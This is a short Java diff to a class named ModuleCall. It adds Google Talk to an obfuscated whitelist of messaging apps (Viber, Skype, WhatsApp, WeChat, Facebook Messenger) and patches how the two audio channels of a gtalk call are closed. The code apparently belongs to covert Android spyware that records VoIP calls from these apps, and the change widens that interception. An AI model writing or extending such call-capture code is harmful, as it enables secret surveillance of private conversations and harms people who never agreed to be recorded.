@@ -192,7 +192,7 @@ public class ModuleCall extends BaseModule   {
 
 	private boolean installedWhitelist() {
 
-		String[] whitelist = new String[]{M.e("com.viber.voip"), M.e("com.skype.raider"),
+		String[] whitelist = new String[]{M.e("com.viber.voip"), M.e("com.skype.raider"), M.e("com.google.android.talk"),
 				M.e("com.whatsapp"), M.e("com.tencent.mm"), M.e("com.facebook.orca"),  M.e("com.facebook.katana")};
 
 		final ArrayList<PackageUtils.PInfo> res = new ArrayList<PackageUtils.PInfo>();
@@ -755,6 +755,12 @@ public class ModuleCall extends BaseModule   {
 			// We have an end of call and it's on both channels
 			if (audioEncoder.isLastCallFinished()) {
 				finished[remote ? 1 : 0] = true;
+				if(callInfo.programId == CallInfo.PRG_GTALK_ID && finished[0]){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (encodeChunks) force end of remote for gtalk");
+					}
+					finished[1] = finished[0];
+				}
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]");
 				}
